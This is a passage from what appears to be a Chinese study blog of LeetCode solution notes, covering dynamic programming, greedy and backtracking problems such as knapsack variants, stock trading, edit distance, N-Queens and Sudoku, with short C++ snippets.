考虑num[i]，若选择nums[i]，容量变为dp[j - nums[i]]，含义是加入nums[i]后的方法数，随着i的变化dp[j]可以得到多种方法数，把他们累加起来 即 dp[j] += dp[j - nums[i]] 算出重量为j的背包的方法总数 本题dp[0]不能再是0了，因为dp数组意义变了，容量为0的背包仍然有一种放法，即放0，故dp[0] = 1 求背包方法数的模板如下： 123456789dp[0] = 1;//初始化为1，容量为0的背包有一种方法，即放0for(int i = 0; i &lt; nums.size(); i++)&#123; for(int j = part; j &gt;= nums[i]; j--) &#123; dp[j] += dp[j - nums[i]]; //容量为j的背包，若考虑放入nums[i]方法数为dp[j - nums[i]]，累加起来 &#125;&#125; 474. 一和零显然是背包问题，但与一般背包不同的是它有两种“重量”，即同时要求0和1的数目。因此本题的dp数组应该是二维的dp[i] [j]，这样才能同时更新两种“重量” dp数组的含义还是问什么设什么，本题设dp[i] [j]为容量为i，j的背包取得的最大子集长度。那么状态转移方程也相应地改变了 每次选取一个字符串不再是增加价值或子集累和，而是让子集长度加1，于是： dp[i] [j] = max(dp[i] [j], dp[i - zero] [j - one] + 1) 若选择该字符串，容量相应地减小，子集长度加1，取最大值得到最长子集长度 更新dp的步骤和之前的一样，只不过多了一层for 完全背包在01背包中说过，若里层for不倒序将重复选择，而完全背包物品数量无限，可以重复选择，因此把里层for改为顺序即可。 518. 零钱兑换 II典型的完全背包问题，把模板改为顺序即可。 本题求的是方法数，和目标和那题一样，状态转移方程是一个累加式： dp[j] += dp[j - coins[i]] 377. 组合总和 Ⅳ和上题非常像，唯一的不同是本题求得是排列，即[1,2] 和 [2,1]当作不同的结果，而上一题是求组合，[1,2] 和 [2,1]一视同仁。 对于求排列我们需要考虑物品的顺序，此前模板的两层for外层是选物品，然后内层用不同容量的背包装，这样选物品就隐式地固定了顺序。组合问题需要交换两层for，先选背包，之后选择物品： 12345678910vector&lt;int&gt; dp(target + 1);dp[0] = 1;for(int i = 0; i &lt;= target; i++)//先选背包&#123; for(int j = 0; j &lt; nums.size(); j++)//再选物品 &#123; if(i - nums[j] &gt;= 0)//多一步判断越界 dp[i] += dp[i - nums[j]]; &#125;&#125; 322. 零钱兑换和之前零钱兑换一样的完全背包问题，此题求最少硬币数 问什么设什么，dp[j]含义是凑金额 j 需要dp[j] 个硬币，于是有递推公式： dp[j] = min(dp[j], dp[j - coins[i]] + 1) 由于是求用min更新最小值，dp应该初始化为INT_MAX，另外注意dp[0]表示凑金额0需要的硬币，应该初始化为0，否则递推公式无法更新 279. 完全平方数和凑零钱差不多，只不过没有coins而是从完全平方数里面选。 外层for就从遍历coins改为for(int i = 1; i * i &lt;= n; i++)从而遍历完全平方数 其他都一样 139. 单词拆分新类型，以字符串的形式进行匹配。常规背包是用数字拼成target，本题用字符串长度作为中介，思路是查询前 i 为字符组成的子串是否在字典里。 本题先遍历背包（字符串s）更符合直觉，将s拆分成子串然后利用哈希表查询它们是否在wordDict中。外层i遍历s的每一位，dp[i]表示前 i 位字符是否在wordDict里，dp[i]值为true或false，内层遍历0-i ，获取子串。 （有点难用语言描述，看代码就懂了） 多重背包01背包每种物品只能用一次，完全背包每种物品可以用无限次 多重背包每种物品可以用指定次数 解决方法是把多重背包转化为01背包：若一个物品weight = 3， value = 4， nums = n，那么可以在weights数组中额外加入n - 1个3，在values数组中额外加入n - 1个4，相当于把次数在weights和values中体现出来，之后当作01背包处理即可。 背包总结初始化反向初始化 若求最大值，初始化为0；若求最少数目，初始化为INT_MAX dp[0]比较特殊，根据意义和递推公式初始化 递推公式1、最大价值：dp[j] = max(dp[j], dp[j - weight[i]] + value[i]) 2、装满背包：dp[j] = max(dp[j], dp[j - nums[i]] + nums[i]) 3、装满的方法数：dp[j] += dp[j - nums[i]] 4、装满背包所需的最少物品数：dp[j] = min(dp[j], dp[j - coins[i]] + 1) 遍历顺序01背包逆序遍历背包重量 完全背包顺序遍历背包重量 如果求组合数就是外层for遍历物品，内层for遍历背包。 如果求排列数就是外层for遍历背包，内层for遍历物品。 198. 打家劫舍依据dp的一般思路，问什么设什么，dp[i]表示0-i可获得的最高金额。 当遍历到num[i]时我们有两种选择，盗或不盗： 若盗，那i - 1就不能盗了，dp[i]将从dp[i - 2]变化过来，dp[i - 2] + nums[i] 若不盗，那此时能得到的最高金额还是和上一格一样，即dp[i - 1] 取二者的最大值，转移方程为：dp[i] = max(dp[i - 2] + nums[i], dp[i - 1]) dp[i]表示最大金额，故dp[0] = nums[0], dp[1] = max(nums[0], nums[1]) 由于dp[i]只取决于前两个状态，可以用滚动数组代替节省空间 123456789101112int len = nums.size();if(len == 1) return nums[0];vector&lt;int&gt; dp(len);dp[0] = nums[0];dp[1] = max(nums[0], nums[1]);for(int i = 2; i &lt; len; i++)&#123; dp[i] = max(dp[i - 2] + nums[i], dp[i - 1]); //是否打劫num[i]，是则从dp[i - 2]过来，否则等于上次遍历的结果dp[i - 1]&#125;return dp[len - 1]; 213. 打家劫舍 II在环上打劫，第一个想法是模拟，用取余的方法使之首尾相接，但是回到i = 0或1后无法进行i - 2。 转化思路，首尾相接的影响就是第一个元素和最后一个元素不能同时选取，所以分两次进行dp，通过设定边界，第一次是0到len - 2即不选最后一个，第二次是1到len - 1不选第一个。 把环拆成两个队列是一种常见的算法思路。 337. 打家劫舍 III在二叉树上打劫，打劫问题的核心还是在于是否打劫当前的住户，若打劫有什么影响若不打劫又有什么影响。当遍历到节点cur时 若打劫cur，那就不能打劫子节点了，于是向下递归地打劫孙子节点 rob(cur-&gt;left-&gt;left) + rob(cur-&gt;left-&gt;right) 和 val1 + rob(root-&gt;right-&gt;left) + rob(root-&gt;right-&gt;right)，再加上cur自身的值就是这种情况的结果 若不打劫cur， 那就打劫cur的子节点 rob(root-&gt;left) + rob(root-&gt;right)，这时就不用加cur的值 以上二者取最大值就是cur节点能打劫的最大值，为了避免每次涉及cur都要重新计算该值，可以用一个哈希表把结果存起来 总之还是围绕是否打劫这一核心问题，无非是把线性的dp数组改为了遍历形式。 121. 买卖股票的最佳时机经典的股票收益问题，最好的解法是维护一个最小价格，然后动态更新最大收益 但该解法只适用于这种最简单的一次买卖的情况。 对于复杂的股票问题需要dp解法，我们用两个dp[i]表示第i天的收益，有买入和卖出两种状态，所以需要把dp拓展成二维的dp[i] [0] 和 dp[i] [1] 初始买入的收益为-price[0]表示买入了第一天的股票 初始卖出为0，因为只有一天暂无收益 若考虑在第i天买入，不买则为前一天的情况dp[i - 1] [0]，买则花费当天价格-price[i] 若考虑在第i天卖出，不卖,则为前一天的情况dp[i - 1] [1]，卖则由上一次买入的收益加上本次卖出的收益，即dp[i - 1] [0] + prices[i] 在二者中取最大值即可，模板为： 12345678910 vector&lt;vector&lt;int&gt;&gt; dp(prices.size(), vector&lt;int&gt;(2)); dp[0][0] = -prices[0];//预付第一次的钱 for(int i = 1; i &lt; prices.size(); i++) &#123; dp[i][0] = max(dp[i - 1][0], -prices[i]); dp[i][1] = max(dp[i - 1][1], dp[i - 1][0] + prices[i]); &#125; return dp[prices.size() - 1][1];&#125; 122. 买卖股票的最佳时机 II可以直接计算差值（贪心），此处用dp方法： 和上一题相比可以多次买入，于是买入的状态就取决于上一次的卖出状态，上次卖出的收益为dp[i - 1] [1]，所以买入后的收入为dp[i - 1] [1] - prices[i] 其他和模板一样 123. 买卖股票的最佳时机 III这种复杂情况的问题考虑划分状态（之前的监控节点也是） 对于每一天可以划分为5中状态：1、无操作，2、第一次买入，3、第一次卖出，4、第二次买入，5、第二次卖出 第一次买入时，可能不买（buy1），可能买入（0 - price[i]） 第一次卖出时，可能不卖（sell1），可能卖出（buy1 + price[i]） 第二次买入时，可能不买（buy2），可能买入（sell1 - price[i]） 第二次卖出时，可能不卖（sell2），可能卖出（buy2 + price[i]） 都是取二者的最大值 初始化买入都为-price[0]，卖出得到0 一次遍历即可，sell2就是两次卖出后的最大结果 （也可以套用模板，5种状态就把dp数组维度改为5，然后依据状态转移关系更新） 188. 买卖股票的最佳时机 IV推广上一题，由于k未知就不能再用几个变量来dp了，改为设置二维dp数组（模板法） dp[i] [j] 表示第i天进行行为j的最大收益，行为 j 有 2 * k + 1种，即k次买和卖，1次无操作。j = 0时无操作，j = 奇数时买，j = 偶数时卖，初始化方法和上一题一样，买入时，即 j 为奇数时dp[0] [j] = -price[0] 更新dp的方法也和上题一样，用 i - 1 表示上一次的结果，j - 1表示上一次操作： dp[i] [j] = max(dp[i - 1] [j], dp[i - 1] [j - 1] - prices[i]); dp[i] [j] = max(dp[i - 1] [j], dp[i - 1] [j - 1] + prices[i]); 最终dp[prices.size() - 1] [2 * k]就表示遍历完每一天后k次卖出的收益 309. 最佳买卖股票时机含冷冻期第一个想法是设置flag标记冷冻期，但这会阻碍dp，只起到贪心的效果 对于复杂问题还是用状态分析法，本题有3种状态： 1、持有股票，2、无股票且在冷冻期，3、无股票且不在冷冻期 用dp[i] [j] (0 &lt;= j &lt;= 2)表示第 i 天操作后三种状态的最大收益 若持有股票，无买入为dp[i - 1] [0]，买入从状态3转化而来，为dp[i - 1] [2] - price[i] 若无股票且在冷冻期，说明第 i 天一定进行了卖出，直接赋值dp[i - 1] [0] + price[i] 若无股票且不在冷冻期，说明第 i 天既没买入也没卖出，取无股票的两种情况即dp[i - 1] [1] 和 dp[i - 1] [2]的最大值 714. 买卖股票的最佳时机含手续费和最佳时机2相比多了一笔手续费，在更新卖出状态时，除了加prices[i]再多减一个fee就可以了 总之，股票问题核心在状态的划分和转化，可以买卖次数的不同，或者冷冻期、手续费的引入都影响其状态 300. 最长递增子序列问什么设什么，dp[i] 表示从0到i的最长递增子序列长度，dp[i] 取决于什么？它取决于和前面元素的大小关系，设 j &lt; i ，若nums[j] &lt; nums[i]，说明nums[i]可以和它构成递增子序列，此时可让dp[i] = dp[j] + 1 选定 i 后遍历0~i，若满足递增条件则更新dp[i]的值，每次得到dp[i]后更新res的值，因为最长子序列的终点不一定是dp[size - 1]，而是dp数列的最大值，模板如下： 123456789101112vector&lt;int&gt; dp(nums.size(), 1);//每个元素都可视为一个子序列，故初始化为1int res = 0;for(int i = 1; i &lt; nums.size(); i++)&#123; for(int j = 0; j &lt; i; j++)//遍历i之前的所有元素 &#123; if(nums[j] &lt; nums[i])//可构成递增序列 dp[i] = max(dp[i], dp[j] + 1); &#125; res = max(res, dp[i]);//在dp过程中更新最大序列res&#125;return res; 674. 最长连续递增序列1、直接统计，当num[i] &lt;= nums[i - 1]时把i设定为起点beg，否则计算当前长度i - beg，动态更新最大的i - beg 2、dp，类似上题模板，但此题要求连续，所以只需要和前一个元素比较即可，因此不用遍历0-i， 若符合递增，则dp[i] = dp[i - 1] + 1 718. 最长重复子数组由于需要比较两个数组，dp需要二维，正常dp[i] [j] 表示截止num1的 i 和nums2的 j 的最长重复长度，这样的dp[i] [j] 取决于dp[i - 1] [j - 1]， i，j从0开始就需要讨论等于0的情况，比较繁琐。一个技巧是 i 和 j 从1开始，dp[i] [j] 就表示截止i - 1和j - 1的最大长度 比较nums1[i - 1]和nums2[j - 1]，若相等则dp[i] [j] = dp[i - 1] [j - 1] + 1 12345678910111213vector&lt;vector&lt;int&gt;&gt; dp(nums1.size() + 1, vector&lt;int&gt;(nums2.size() + 1));int res = 0;for(int i = 1; i &lt;= nums1.size(); i++)&#123; for(int j = 1; j &lt;= nums2.size(); j++) &#123; if(nums1[i - 1] == nums2[j - 1]) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; res = max(res, dp[i][j]); &#125;&#125; 由于dp[i] [j] 只和dp[i - 1] [j - 1]有关，dp数组可以改成一维的，这时内层 j 的for循环需要倒序避免重复考虑同一个元素（类似01背包） 1143. 最长公共子序列和上一题的不同在于不需要连续，模板依然是二维dp，意义也相同， 当text1[i - 1] == text2[j - 1]时，同样在前面dp的基础上加1。 当text1[i - 1] ！= text2[j - 1]时，上一题是不管（赋0），因为出现了不连续就要重新计算。但本题允许不连续，所以可以接着往后考虑下一个字符，若使text1向后移动一位，text2不动就是dp[i] [j - 1]，若使text2向后移动一位，text1不动就是dp[i - 1] [j]，取二者的最大值 由于不要求连续，最长的子序列的值保存在dp的最后一位里，不用像上一题一样在更新的过程中保存。 1035. 不相交的线稍加分析，和上一题一模一样 53. 最大子数组和之前贪心做过，就是一直累加，直到加完某个值nums[i]后的结果比nums[i]还要小，说明之前的结果是拖后腿的，从nums[i]重新累加。 用dp思想重述一下就是，0-i最大子数组和dp[i]取决于两个量，可能是之前的累加值加上当前值即dp[i - 1] + nums[i]，也可能重新累加即nums[i]，取二者最大值。同时在遍历的过程中更新最大res 392. 判断子序列1、双指针，t每次后移一位，s匹配成功才后移一位，完成指针移动后看s的指针是否已经移出字符串到达’\\0’ 2、dp，可以看作公共子序列的匹配，最后匹配长度等于s的长度说明s完全匹配了 115. 不同的子序列和上一题相比可能有多种匹配情况，因此当s[i - 1] == t[i - 1]时不能默认它进行匹配，比如abb和ab，未必要选择s[1]的b，因为后面可能还有b。因此分两种情况： 1、选择匹配s[i - 1]和t[j - 1]，删除（后移不再考虑）这两字符，dp[i] [j]等于之前的匹配结果dp[i - 1] [j - 1] 2、选择不匹配，s串删除该字符，t还需继续考虑这个字符，dp的结果为dp[i - 1] [j]，也就是s忽略该字符，而t继续匹配该字符 当s[i - 1] ！= t[i - 1]时无法匹配，只能和上面第二种情况一样 由递推方程知需要非零初始化，dp[i] [0] = 1表示从长为i的字符串匹配长为0的字符串，必定有且只有一种方法，也就是全删 583. 两个字符串的删除操作1、和最短子序列匹配一样，匹配完之后用两个字符串的长度减去最短公共长度就是双方需要删除的长度 2、直接用dp思想，若word1[i - 1] != word2[j - 1]，可以各自删除一个字符，或者其中一方删除一个字符，即dp[i - 1] [j - 1] + 2, dp[i - 1] [j] + 1, dp[i] [j - 1] + 1 72. 编辑距离在上一题的基础上加了添加和替换操作，但一个字符串添加一个字符和另一个字符串删除一个字符是一样的，都是进行一步操作，如abd和abcd，可以给串1加c，也可以给串2删除c，虽然意义不同，但都抽象为一步操作。因此本题无需额外考虑添加 对于替换，是在上一次操作的基础上加多一步操作，即dp[i - 1] [j - 1] + 1，也因为这个式子，上一题删除时的dp[i - 1] [j - 1] + 2就不用考虑了，双方都删除一个字符还不如其中一方替换一下。 完整代码如下： 12345678910111213141516171819202122vector&lt;vector&lt;int&gt;&gt; dp(word1.size() + 1, vector&lt;int&gt;(word2.size() + 1));//长为i的串转为空串需删i次for(int i = 0; i &lt;= word1.size(); i++)&#123; dp[i][0] = i;&#125;//长为j的串转为空串需删j次for(int j = 0; j &lt;= word2.size(); j++)&#123; dp[0][j] = j;&#125;for(int i = 1; i &lt;= word1.size(); i++)&#123; for(int j = 1; j &lt;= word2.size(); j++) &#123; if(word1[i - 1] == word2[j - 1]) dp[i][j] = dp[i - 1][j - 1]; else dp[i][j] = min(&#123;dp[i - 1][j] + 1, dp[i][j - 1] + 1, dp[i - 1][j - 1] + 1&#125;); &#125;&#125;return dp[word1.size()][word2.size()]; 上面几题都是对两个字符串的匹配，思路是开二维dp数组，当s[i - 1]和t[j - 1]匹配时无需操作，当它们不匹配时就需删除其中一方或双方都删除，更进一步还有替换操作 647. 回文子串先遍历字符串，选定s[i]，再遍历 0-i 找和s[i]一样的字符（不同字符一定不组成回文串），但遇到同样字符又不能保证一定组成回文串，如abcda，这里涉及距离的问题。 若距离小于2，如a或aa，一定是一个回文串。若距离大于等于2，但i，j之间的字符串也是回文串，如abcba，那它也是一个回文串，由于需要记录子串是否是回文串，此题的dp数组类型是bool，另外用res记录回文子串数目。 综上，回文串的条件为：s[i] == s[j] &amp;&amp; (i - j &lt;= 1 || dp[i - 1] [j + 1]) 516. 最长回文子序列子序列是可以不连续的，这种不连续性需要通过dp数组的 +1和-1实现，所以此题的dp[i] [j]含义为从i 到 j 的最长回文子序列长度，当一个回文序列的首尾各加一个字符，且这两个字符相等，那么加后的新字符串也是回文串，且长度为原长度加2，表达式为 dp[i] [j] = dp[i + 1] [j - 1] +2 若这两个字符不相同，那二者只能取一个，否则无法构成回文串，取首字符则新字符串的可能回文长度为dp[i + 1] [j]，取尾字符为dp[i] [j - 1]，再取二者最大值。 由于i依赖于后面的i + 1，所以外层的i应该倒序遍历，j则从i + 1开始顺序遍历 还有初始化，dp[i] [i]表示从i到i也就是s[i]本身，它是长为1的回文串，所以应该赋值为1。 类似子序列，最长回文串序列也是通过+1 或 -1来达到跳过无用字符的目的，但由于回文序列判断方法比较特殊（首尾字符判断），状态转移方程和遍历顺序会不同。","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-贪心算法","date":"2022-07-30T09:56:29.000Z","path":"2022/07/30/代码随想录-贪心算法/","text":"包括455. 分发饼干，376. 摆动序列，53. 最大子数组和，122. 买卖股票的最佳时机 II，55. 跳跃游戏，45. 跳跃游戏 II，1005. K 次取反后最大化的数组和，134. 加油站，135. 分发糖果，406. 根据身高重建队列，452. 用最少数量的箭引爆气球，435. 无重叠区间，763. 划分字母区间，56. 合并区间，738. 单调递增的数字，714. 买卖股票的最佳时机含手续费，968. 监控二叉树 455. 分发饼干排序+遍历，小孩小饼干大孩大饼干。 376. 摆动序列从第二个元素开始计算每个元素和前一个元素的差值，用一个变量flag记录该差值的正负，初始为0，后续用1和-1表示正负 若相等则跳过该元素；若本差值和flag异号，使res加1，并更新flag的正负。 53. 最大子数组和重点是知道什么时候更换起点：当当前值加上sum得到的新sum比当前值还要小，即sum + nums[i] &lt; nums[i]，说明前面的子数组和是拖后腿的，所以让nums[i]做新起点。每轮更新sum之后再和res比较，看是否是更大的子数组和 122. 买卖股票的最佳时机 II不用考虑购买成本的问题 由于可以多次买入卖出，只要发现有利可图就卖，这就是贪心的思想。 和前一天的价格比较，今天价格更高则卖出获利；今天价格低则买入（不做处理，下一次卖出时隐含了上一次的买入） 55. 跳跃游戏本题很容易取纠结跳几步，踩到0以后如何往回走等问题 其实从最大范围的角度可以避免这些讨论，从0开始走每走一格就获得了一个辐射长度，即 i + nums[i] ，在这个范围的格子都能走到，且这个范围内的格子都代表一个辐射长度 i + nums[i]，每走一步就更新最大范围，若最大范围延伸到了最后一格就满足题意，走完了该范围的尽头说明无法到达。 从范围的角度就不用讨论遇到0的情况，只需不断更新最大范围即可 45. 跳跃游戏 II需要知道跳跃的次数，就不能只考虑覆盖范围的扩张了。 跳的步数最少就需要跳的尽可能远，但又不能每次都直接跳最远 如 2，3，1，1，1，1，若第一次跳2后续将耗费更多步骤，跳到3才是最好的，因为它能最大地扩展覆盖范围。因此跳到哪一格的依据是哪一格能最大化覆盖范围。 第一格使覆盖范围变成 2,3,1，我们先不跳，往后搜索直至能跳的最大边界1，在搜索的过程中不断更新最大覆盖范围cover，这个cover就是下一次跳跃的边界。当搜索到1的时候就完成了cover的更新，这时可以说完成了一次跳跃（跳到哪无需显式声明），并把刚刚得到的cover当作是下一次跳跃的边界。 注意边界最大为 nums.size() - 2，不用到达最后一个元素 1005. K 次取反后最大化的数组和首先是排序，从小开始尽可能地把负数取反。若k比负数的数目少，结束即可，若取反完成后k还有多就要考虑把非负数取反。 由于可以一个数多次取反，只对最小的那个非负数操作即可。若剩下的k为偶数，这个数不变，若剩下的k为奇数，这个数进行一次取反。注意这个最小的非负数需要再次排序后确定，以免再次对已取反的负数操作。 134. 加油站暴力法：把每个站都当作起点，然后判断油是否足够，大量数据超时 一次遍历：对于每个站gas[i] - cost[i] 就是它离开时的净油量，若这个值大于0，它可以前往下一站，若小于0，就只能到此为止了。可以计算每个站的净油量之和sum，若sum大于0则油足够，继续向后走，若在gas[i]处出现sum&lt;0说明从之前的任意一个站出发都最多到达i，只能选择后面的站为起点。 另外一个问题是是否存在这样的起点？比较gas和cost的总和即可，若gas更多一定有这样一个起点。所以在找起点的过程中也要顺便统计所有站的gas-cost总和 135. 分发糖果有一种情况：1,2,3,2,1， 若从左往右遍历，统计得到3那里分配2个糖果，但后面遍历到2时它也分配2个糖果，二者评分不同糖果却相同，不合题意。 之所以出现这样的问题是因为这个序列同时出现升序和降序，二者交界处的结果同时受两侧影响。解决办法是分两次遍历，一次从左到右，每个孩子只和左边的孩子比较，一次从右往左，每个孩子只和右边的孩子比较。相当于把降序也转化为了升序，先处理评分低的 406. 根据身高重建队列按身高降序排列后，每个元素的序号值就代表了待插入的位置索引，对list的插入操作要熟悉。 452. 用最少数量的箭引爆气球直观的想法是按左端从小到大排列，然后比较新的气球start是否超过之前最小的右端，超过了就需要加一支箭。这个“最小右端”需要动态维护。 由于右端才是主要决定因素，可以直接按右端排序，这样每一箭第一个气球的end就是最小右端，无需另外维护了。 435. 无重叠区间和上一题思想基本一样，上一题要尽量重叠，本题尽量不重叠。 依然是按右端排序，为了不重叠本题要维护最大右端（最大右端都不重叠其他一定不重叠），排序之后上一个区间的end就是这个最大右端了。 遍历，如果当前的start大于最大右端，说明不重叠，把当前右端设置为最大右端；如果start小于最大右端，会重叠，计数加1，不更新最大右端 763. 划分字母区间没接触过这种思路的话就非常难。 首先怎么让字母最多出现在一个段里？这取决于它最远的那个字母，至少从该字母的第一次出现位置到最后一次出现的位置要是同一段。将这个思路推广到所有字母，从左往右遍历，把字母加入段中，每个字母的最远距离的最大值就是该段的结尾处，在加入字母的过程中不断更新最远距离，直到遍历到达那个最远位置，说明段内的所有字母都已经在段中了，再往后不会出现这些字母。这就分好了一个段，往后重复这个过程。 核心思想就是：段长度是由字母的最远位置决定的，到达了这个位置，段就结束了 56. 合并区间区间类题目，依然先排序。区间合并的标准是看两个区间有没有交集，其中一个区间的左端点在另一个区间内就说明可以合并。因此本题排序左端点，然后按照上面的规则判断能否合并。若可以合并，后续区间可能也可以合并，先更新最大右端；若没有交集无法合并，之前的start和end就划分出了合并后的区间，然后重新初始化start和end，开始找下一个右端。 738. 单调递增的数字从后往前遍历，若遇到不符合条件的相邻位，如31，由于整体不能增大，所以不能只改第二位，只能把第一位减1，第二位赋值9能保证尽可能大。最好的改法就是让前一位减1，后一位变为9。 还要考虑一种情况如 3124，后半部分原本不用改，但1改成9后它们也得跟着改，也就是说当有一位改成9，它后面的部分一定要跟着改成9保证单调增。所有遍历时先检查但不改，找到需要改的最左侧的位后再一次性改完。 还有一点就是需要拆分数位，可以迭代然后用vec储存，更节省空间的做法是转化为string（不会预先分配两倍空间），以后数字串的题都应考虑转string 714. 买卖股票的最佳时机含手续费贪心的思路有点抽象…以后学了dp再改吧 大意就是 price[i] = min_price + fee 时不赚不赔，得到min_price的平衡点是price[i] - fee，每次卖出用这个式子更新min来检验下次的买入 968. 监控二叉树一个重要的问题是以什么顺序去判断？一种简便的方法是后序遍历，这样可以根据两个子节点判断一个节点是否需要放置摄像头。节点的状态可以分为3种情况：1、安装了摄像头，2、被摄像头覆盖，3、未被覆盖 若子节点至少有一个未被覆盖，本节点都应该安装摄像头 若子节点都被覆盖，本节点无需再安装，设置为未覆盖 其他情况（由前两个判断已知子节点没有未覆盖且不是都覆盖）也就是有至少一个摄像头，本节点设置为已覆盖。 最后还要判断头结点的状态。","comments":true,"tags":[{"name":"代码随想录","slug":"代码随想录","permalink":"http://yoursite.com/tags/代码随想录/"}]},{"title":"代码随想录-回溯","date":"2022-07-23T08:51:28.000Z","path":"2022/07/23/代码随想录-回溯/","text":"包括77. 组合，39. 组合总和，40. 组合总和 II，216. 组合总和 III，17. 电话号码的字母组合，131. 分割回文串，93. 复原 IP 地址，78. 子集，90. 子集 II，491. 递增子序列，46. 全排列，47. 全排列 II，332. 重新安排行程，51. N 皇后，37. 解数独 77. 组合经典组合问题，分为横向遍历和纵向遍历两部分，横向遍历是选择不同的起点，纵向遍历是加入其它元素。模板为： 123456for(int i = beg; i &lt;= end; i++)&#123; push(); backTracking(i + 1); pop();&#125; 通过for语句选择不同的起点（横向）然后加入结果中，再通过for里面的递归函数向下其他元素。注意递归的参数是当前起点i的下一个节点i+1 一个优化技巧是缩小end的值，每轮遍历时tmp已有tmp.size()个元素，共需要k个元素，所以还要k - tmp.size()个元素，因此end的位置应该是 n - （k - tmp.size() ）+ 1 39. 组合总和上一题限定组合的长度，本题限定组合的和。 查找和回溯过程一样是用for+递归，为了避免重复计算tmp的和，用target向下减的方法判断是否满足组合条件，每次让target-candidate[i]，当target=0时就找到了一个组合。当target&lt;0时说明元素过大，return剪枝 40. 组合总和 II和上一题相比限定了不能出现重复的组合。若产生全部组合后再去重非常麻烦，应该在产生的过程中去重。 设想重复的情况：aa…..第二个a找到的符合条件的组合，第一个一定也找到过，所以当我们发现当前元素和上一元素相同，直接剪枝不用再向下执行了。这样做的一个前提是candidate数列有序，才能确保不相邻的位置没有相同元素。 因此在上一题基础上先对candidate排序，然后每次额外判断candidate[i]和candidate[i - 1]是否相同即可。 216. 组合总和 III和组合很相似，把可选的集合换成了1-9，且退出递归的条件是和为target 17. 电话号码的字母组合不是在给定的集合中进行元素组合，要多进行一次映射，将参与组合的元素从表中取出，然后加入for模板进行回溯。 这时beg不再是下一个字母，不能设置为i + 1，因为它不是在自己的串内组合而是找其他字符串，beg应该设置为beg + 1即下一个数字 131. 分割回文串本质上也是组合问题，但不是单个元素离散组合，而是连续型的分割。横向for就是取不同起点，纵向递归就是找后续的字符。 每次找到新起点时用substr得到begin到当前i 的子串，然后改变起点，注意这里改变起点不再是+1，因为子串可能长度不为1，正确的做法是begin + substr.size() 跳过子串，避免新起点在原子串内 93. 复原 IP 地址用组合枚举每一种划分方法，但这题有很多条件不能随意选取字符串。 首先每次选取的子串长度是1-3，决定子串长度for语句范围就是1-3。每次选取完子串后要检查是否合法，比如第一个数不能为0，子串不能大于255等问题。划分结果是否能加入res中要看两个条件：是否恰好遍历完所有字符，以及是否划分成了4部分，为了检查第二个条件还需要另外加一个计数器每次划分后+1。 78. 子集除了加入res的条件，和组合基本一样。任意新子集都加入res中无需判断 90. 子集 II新增去重的需求，和组合II完全一样的方法，和本层起点相同的元素直接忽略 491. 递增子序列和上题类似的组合+去重，但本题需要判断递增序列，不能打乱原本的顺序，因此不能使用之前排序+判断相邻元素是否相等的方法。 判断递增子序列很简单，比较当前的num[i]和上一个加入的元素tmp.back()的大小，注意不是比较num[i - 1]，也不是比较nums[beg]，是和上一个加入的元素比 去重方面，当同一层选取起点时，若发现当前值已经在前面被选过（和上一题的去重原则一样）使之continue。由于不能排序，只好搜索之前选过的起点，或者用空间换时间，用一个哈希表记录选过的起点，每次选起点时判断当前nums[i]是否在哈希表中，不在才进行后面的操作。 注意这个哈希表要在每一层（也就是每次进入backtracking函数）开一个，不能作为参数全局使用，因为不同层是可以相同的。 比如[1,1]第一个起点可以选择1,1但第二个起点直接continue 总结：若起点不能相同，每次进入函数开一个局部变量used去重；若不能选相同的元素，used设置为全局变量。 46. 全排列1、两两交换，和组合不同，排列有顺序的要求，例如[1,2]只有这一种组合，但排列有[1,2] [2,1]两种，也就是说每个元素作为起点不仅要向下找搭档，也要向前找搭档。在组合问题里我们将下一个起点设置为i + 1确保选择的是当前元素后面的元素，在排列问题中，则应该设置起点为beg + 1，这样才能和前面的元素搭档。 2、常规回溯思路，由于要和其他所有元素组合，for从0开始而不用beg，但此时的问题是选到重复的元素，因为每层的for都把所有元素过了一遍。可以用一个used数组去重，如上题的总结，这里的去重是避免重复元素，故把used作为一个参数。 123456for(int i = beg; i &lt; nums.size(); i++)&#123; swap(nums[i], nums[beg]); backTracking(nums, beg + 1);//排列beg+1,组合i+1 swap(nums[i], nums[beg]);&#125; 123456789101112for(int i = 0; i &lt; nums.size(); i++)//从0开始&#123; if(used[i] == true) &#123; continue; &#125; used[i] = true; tmp.push_back(nums[i]); backTracking(nums, used); tmp.pop_back(); used[i] = false;&#125; 47. 全排列 II和上一题一样，多了个去重操作，这次的去重是不能选取相同的起点，因为起点相同排列必定相同。如上上题总结，每次进入backtracking函数就开一个哈希表用于记录本层使用过的起点。 一个是横向去重，一个是纵向去重 1234567891011121314bool same[21] = &#123;false&#125;;//避免相同的起点for(int i = 0; i &lt; nums.size(); i++)&#123; if(used[i] == true || same[nums[i] + 10] == true) &#123; continue; &#125; same[nums[i] + 10] = true;//该元素已充当过起点 used[i] = true;//该元素在排列中出现过 tmp.push_back(nums[i]); backTracking(nums, used); tmp.pop_back(); used[i] = false;&#125; 332. 重新安排行程若用全排列的思路实现首尾相同非常耗时，可以用一个哈希表先记录起点到终点的映射，然后更换不同的终点进行尝试即可。为了避免环路的无限循环，每走过一条路应该马上删除，可以设置一个计数器走过-1，为0不可用来达到逻辑上删除的效果。 另外本题找到一条最短路径即可，也就是第一个实现大小等于ticket大小-1的res就是需要的答案，此时直接结束。故回溯的返回类型的bool的。 51. N 皇后建立n行n列的”棋盘“，这里用vectors表示，注意vector和string都可以随机存取，也就是说该棋盘用chess[i] [j]即可选择某个棋子，即便不像二维数组那样里外同类型（赞美STL）。 利用回溯模板，for语句内逐列放棋子，检查是否合法，合法则设置为Q，回溯时改回. 在递归语句中让行参数 row 加1，这样就起到了向下面的行放置的效果。当row达到n时说明每一行都放好了且不违法，得到一个结果。 注意几个细节： 1、for语句的条件判断部分如 for（; i &gt;= 0, j &gt;= 0;) 如果想这样用逗号隔开是一个从前往后执行的逗号表达式，它的效果是通过最后一条语句进行判断，违反了判断的初衷，应该用&amp;&amp;代替逗号。 2、string对象的单个元素是char类型的，用单引号而不是双引号 37. 解数独和N皇后不同的是数独中每一个位置都要放元素，故考虑两层for遍历每一个单元。 遍历到一个单元时，先检查是否是数字，是则跳过；之后检查是否符合数独条件，包括同行同列和同方块，前两样很好检查，确定方块用到一个取整技巧： startRow = (row / n) * n，通过除法向下取整的特性可以得到n的整数倍值也就是每个方块的起点坐标。 